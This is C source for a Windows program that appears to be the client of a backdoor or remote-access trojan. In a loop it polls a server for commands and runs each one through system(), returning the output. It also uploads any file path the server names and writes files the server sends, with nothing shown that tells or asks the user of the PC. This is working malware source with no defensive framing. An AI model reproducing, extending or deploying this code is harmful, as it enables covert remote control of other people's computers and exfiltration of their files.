#include <stdio.h>
#include <Windows.h>

#include <cJSON.h>
#include <util.h>
#include <app.h>

#pragma warning(disable : 4996)

#pragma comment (lib, "crypt32")
#pragma comment (lib, "ws2_32")

#if defined(_M_X64) || defined(__amd64__)
// code...
#pragma comment (lib, "../openssl/lib/x64/libssl")
#pragma comment (lib, "../openssl/lib/x64/libcrypto")
#else
#pragma comment (lib, "../openssl/lib/x86/libssl")
#pragma comment (lib, "../openssl/lib/x86/libcrypto")
#endif

#define TEMP_FILE (char*)"./temp.data"
#define TEMP_PATH (char*)"./temp/"

char username[MAX_LEN];
void sendDefaultResult(char* _cmd);
bool running_flag = false;

bool doUpload(char* _srcpath) {
	char restr[MAX_LEN];
	if (!fileExists(_srcpath)) {
		sprintf(restr,"[%s] File does not exist!", _srcpath);
		sendDefaultResult(restr);
		return false;
	}
	FILE* fp = fopen(_srcpath, "rb");
	int filesize = getFileSize(_srcpath);
	int buf_size = filesize > 10 * 1024 * 1024 ? 10 * 1024 * 1024 : 2 * 1024 * 1024;
	char* buf = (char*)malloc(buf_size);

	int total_cnt = filesize / buf_size + 1, cnt = 0;
	fseek(fp, 0, SEEK_SET);
	beginProgress();
	while (!feof(fp) && cnt < total_cnt) {
		int readed = fread(buf, 1, buf_size, fp);
		C_REQ req(USER, buf, readed, username, cnt++);
		bool suc_flag = false;
		do {
			suc_flag = sendFormData(&req);
			Sleep(SLEEP_TIME/10);
		} while (!(suc_flag == true && req.code == SUCCESS));
		showProgress(cnt, total_cnt);
	}

	free(buf);
	fclose(fp);
	endProgress();
	sprintf(restr,"[%s] uploaded [%s] file to server.",username,_srcpath);
	sendDefaultResult(restr);
	return true;
}
//complete
bool doDownload(char* _filename, char* _dstdir, int total_cnt) {
#ifdef DEBUG
	printf("Downloading %s\n", _filename);
#endif // DEBUG
	char* buf = NULL; int buf_len = -1;

	char filename[MAX_LEN];
	if(!dirExists(_dstdir))
		sprintf(filename, "%s%s", TEMP_PATH, _filename);
	else
		sprintf(filename, "%s%s", _dstdir, _filename);

	FILE* fp = fopen(filename, "wb");
	beginProgress();
	for (int i = 0; i < total_cnt; i++) {
		C_REQ req(USER, username, i);
		while(req.code != SUCCESS) {
			sendFormDataRead(&req, &buf, &buf_len);
			Sleep(SLEEP_TIME/10);
		}
		showProgress(i+1, total_cnt);
		if(buf != NULL && buf_len > 0 ) fwrite(buf, 1, buf_len,fp);
		if (buf) free(buf);//buf = NULL;
	}
	fclose(fp);
	endProgress();
	return true;
}

DWORD WINAPI RunSystemCmdWithAsync(LPVOID _param) {
	DeleteFileA(TEMP_FILE);
	char* cmd = *(char**)_param;
	char tempstr[MAX_LEN];
	sprintf(tempstr, "%s > %s", cmd, TEMP_FILE);
	system(tempstr);
	return 0;
}

void sendDefaultResult(char* result) {
	C_REQ req(USER, RETURNING, NONE, result, NULL, 0, username);
	while (req.code != SUCCESS) 
		sendFormData(&req);
}

void doExecute(char* _cmd) {
#ifdef DEBUG
	printf("Executing [%s] command on [%s]'s PC!\n", _cmd, username);
#endif // DEBUG
	HANDLE thread = CreateThread(NULL, 0, RunSystemCmdWithAsync, &_cmd, 0, NULL);
	WaitForSingleObject(thread, SLEEP_TIME);
	TerminateThread(thread, 0);
	CloseHandle(thread);
	int filesize = getFileSize(TEMP_FILE);
	if (filesize < 1) {
		sendDefaultResult(_cmd);
		return;
	}
	char* result = (char*)calloc(1, filesize + 1);

	FILE* fp = fopen(TEMP_FILE, "rb");
	size_t nread = fread(result, 1, filesize, fp);
	fclose(fp);
	DeleteFileA(TEMP_FILE);
	C_REQ req(USER, RETURNING, NONE, result, NULL, 0, username);
	while (req.code != SUCCESS) {
		sendFormData(&req);
		Sleep(SLEEP_TIME);
	}
	free(result);
}


int handleCommand(char* buf) {
	
	char* _cmd = getMessage(buf);
	int total_cnt = getTotalCnt(buf);
	if (buf) free(buf);

	char** params = NULL;
	char* orig_cmd = NULL, *exe = NULL;
	int paramcnt = 0;
	bool result = false;
	running_flag = true;

	//save original command to buffer, cos of it should be tokenize
	orig_cmd = (char*)calloc(1, MAX_LEN);
	memcpy(orig_cmd,_cmd,strlen(_cmd));

	params = splitline(_cmd, &paramcnt);
	exe = params[0];

	if (memcmp(exe, UPLOADCMD, strlen(UPLOADCMD)) == 0 && strlen(UPLOADCMD) == strlen(exe)) {
		char fname[MAX_LEN], restr[MAX_LEN];
		memset(restr,0, MAX_LEN);
		memset(fname, 0, MAX_LEN);

		getFileName(params[1], fname);
		result = doDownload(fname, params[2], total_cnt);
		sprintf(restr, "[%s] successfully downloaded [%s] file.", username, fname);
		sendDefaultResult(restr);
	} else if (memcmp(exe, DOWNLOADCMD, strlen(DOWNLOADCMD)) == 0 && strlen(DOWNLOADCMD) == strlen(exe)) {
		result = doUpload(params[1]);
	}
	else {
		doExecute(orig_cmd);
	}

	free(orig_cmd);
	running_flag = false;
	return result;
}


void fetchCommand() {
	char* buf = NULL, *cmd = NULL;
	int file_piece_cnt = 0;
	bool result = false;

	C_REQ req(USER, POOLING, NONE, NULL, NULL, 0, username);
	sendFormDataRead(&req, &buf, NULL);

	if (req.code != SUCCESS || running_flag == true) {//to notify http server
		if (buf) free(buf);
		return;
	}

	cmd = getMessage(buf);
	file_piece_cnt = getTotalCnt(buf);
#ifdef _DEBUG	
	if (cmd == NULL) printf("%s\n", buf);
#endif
	if (cmd != NULL && strlen(cmd) > 0) //handle admin's command.
		handleCommand(buf);
	else {
		if (buf) free(buf);
	}
	if (cmd) free(cmd);
}

bool askName(char* _name) {
	char* buf = NULL, *name = NULL;
	bool result = false;

	C_REQ req(USER, ASK_NAME, NONE);
	sendFormDataRead(&req, &buf, NULL);
	if (req.code != SUCCESS) {
		if (buf) free(buf);
		return false;
	}

	name = getMessage(buf);
	if (_name != NULL && name != NULL && strlen(name) > 0) {
		memcpy(_name, name, strlen(name));
		result = true;
	}
	
	if (buf) free(buf);
	if (name) free(name);
	return result;
}

int main(int argc, char* argv[]) {
	CreateDirectoryA(TEMP_PATH, NULL);
	//initialize wsa library
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("WSAStartup failed!\n");
		exit(0);
	}
	//before running, get name from https server
	while (!askName(username)) Sleep(SLEEP_TIME/2);
#ifdef _DEBUG
	printf("-------------I am %s-------------\n", username);
#endif
	while (true) {
		fetchCommand();
		Sleep(SLEEP_TIME);
	}
	return(0);
}